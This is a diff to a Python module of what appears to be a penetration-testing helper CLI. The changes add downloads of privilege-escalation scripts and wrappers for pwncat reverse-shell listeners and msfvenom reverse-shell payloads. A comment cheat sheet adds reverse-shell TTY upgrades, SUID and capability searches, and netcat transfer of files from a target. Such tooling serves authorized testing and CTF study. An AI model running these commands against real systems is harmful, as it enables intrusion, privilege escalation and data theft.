@@ -1,13 +1,21 @@
+import logging
 import re
+from enum import Enum
 
-from ..cli import Context
-from ..utilities.utils import Utils
+from ..main import Context
+from ..utils.utils import Utils
 
 # ------------------------------------------------------------------------------
 #
 #
 #
 # ------------------------------------------------------------------------------
+
+
+class DownloadWhat(str, Enum):
+    LINPEAS = "LINPEAS"
+    WINPEAS = "WINPEAS"
+    PSPY64 = "PSPY64"
 
 
 class ToolService:
@@ -21,7 +29,7 @@ class ToolService:
     def __init__(self, ctx: Context):
         self.ctx: Context = ctx
         self.utils: Utils = self.ctx.utils
-        self.utils.logging.debug('tool-service is initiated')
+        logging.log(logging.DEBUG, 'tool-service is initiated')
 
     # --------------------------------------------------------------------------
     #
@@ -29,24 +37,26 @@ class ToolService:
     #
     # --------------------------------------------------------------------------
 
-    def download(self, what: str):
+    def download(self, what: DownloadWhat):
         service_name = 'WGET'
         self.utils.log_runBanner(service_name)
         path = self.utils.create_service_folder('download')
-        self.utils.logging.debug(f'new folder created:: {path}')
+        logging.log(logging.DEBUG, f'new folder created:: {path}')
 
         url = None
-        if what == "linpeas":
+        if what == DownloadWhat.LINPEAS:
             url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
-        elif what == "winPEAS":
+        elif what == DownloadWhat.WINPEAS:
             url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat"
+        elif what == DownloadWhat.PSPY64:
+            url = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64"
 
         if url != None:
             cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
                 ['wget', url, '-P', path]
             ])
 
-        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -57,13 +67,37 @@ class ToolService:
     # TODO: add usfull command, to not need to remember all :D
     def info_list():
         pass
-        # find / -perm -u=s -type f 2>/dev/null
+
+        # REVERSE SHELL
+        # - start listener
+        # + pwncat -l $LPORT -vv --self-inject /bin/sh:$LHOST:$LPORT
+        # + nc -lvnp $LPORT
+        # - improve
+        # + python3 -c 'import pty; pty.spawn("/bin/bash")'
+        # + 'Ctr-Z'
+        # + stty -a
+        # + stty raw -echo; fg
+        # + export SHELL=bash;export TERM=xterm-256color;stty rows 19 columns 94
+
+        # SEARCH
+        # - find '+s' files
+        # + find / -perm -u=s -type f 2>/dev/null
+        # - find 'setuid' files
+        # + find / -perm -4000 -exec ls -al {} \; 2>/dev/null
+        # + getcap -r / 2>/dev/null
+        # - find files by specific group
+        # + find / -group <GROUP> 2>/dev/null
+
+        # TRANSFER
+        # - from target
+        # + nc -l -p $LPORT > $FILE
+        # + nc -w 3 $LHOST $LPORT < $FILE
 
     def nc(self, port: int = 9001):
         service_name = 'NC'
         self.utils.log_runBanner(service_name)
         path = self.utils.create_service_folder('tool/nc')
-        self.utils.logging.debug(f'new folder created:: {path}')
+        logging.log(logging.DEBUG, f'new folder created:: {path}')
 
         use_sudo = []
         if port <= 1024:
@@ -71,16 +105,16 @@ class ToolService:
 
         cmd = use_sudo + ['rlwrap', 'nc', '-lvnp', str(port)]
         self.utils.log_runBanner(f'pwncat listening...')
-        self.utils.logging.notice(" ".join(cmd))
+        logging.log(logging.NOTICE, " ".join(cmd))
         self.utils.run_command_endless(command_list=cmd)
 
-        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
 
     def pwncat(self, host: str = None, port: int = 9001):
         service_name = 'PWNCAT'
         self.utils.log_runBanner(service_name)
         path = self.utils.create_service_folder('tool/pwncat')
-        self.utils.logging.debug(f'new folder created:: {path}')
+        logging.log(logging.DEBUG, f'new folder created:: {path}')
 
         if host == None:
             host = self.utils.get_ip_address()
@@ -91,10 +125,10 @@ class ToolService:
 
         cmd = use_sudo + ['pwncat', '-l', str(port), '-vv', '--self-inject', f'/bin/sh:{host}:{port}']
         self.utils.log_runBanner(f'pwncat listening...')
-        self.utils.logging.notice(" ".join(cmd))
+        logging.log(logging.NOTICE, " ".join(cmd))
         self.utils.run_command_endless(command_list=cmd)
 
-        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -106,7 +140,7 @@ class ToolService:
         service_name = 'MSFVENOM'
         self.utils.log_runBanner(service_name)
         path = self.utils.create_service_folder('tool/msfvenom')
-        self.utils.logging.debug(f'new folder created:: {path}')
+        logging.log(logging.DEBUG, f'new folder created:: {path}')
 
         if file_arch == '32':
             reverse_arch = 'x86'
@@ -126,7 +160,7 @@ class ToolService:
             ['msfvenom'] + reverse_payload + [f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{format}'] + reverse_format + reverse_arch
         ])
 
-        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -138,14 +172,14 @@ class ToolService:
         service_name = 'PYWHAT'
         self.utils.log_runBanner(service_name)
         path = self.utils.create_service_folder('tool/pywhat')
-        self.utils.logging.debug(f'new folder created:: {path}')
+        logging.log(logging.DEBUG, f'new folder created:: {path}')
 
         cmd_result = self.utils.run_command_output_loop(f'extract file...', [
             ['pywhat', file],
             ['tee', f'{path}/pywhat.log']
         ])
 
-        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
 
     # --------------------------------------------------------------------------
     #
@@ -157,7 +191,7 @@ class ToolService:
         service_name = 'EXTRACT'
         self.utils.log_runBanner(service_name)
         path = self.utils.create_service_folder('tool/extract')
-        self.utils.logging.debug(f'new folder created:: {path}')
+        logging.log(logging.DEBUG, f'new folder created:: {path}')
 
         if '.tar.bz2' in file:
             extract_type = ['tar', 'xjf']
@@ -190,4 +224,4 @@ class ToolService:
             extract_type + [file]
         ])
 
-        self.utils.logging.info(f'[*] {service_name} Done! View the log reports under {path}/')
+        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
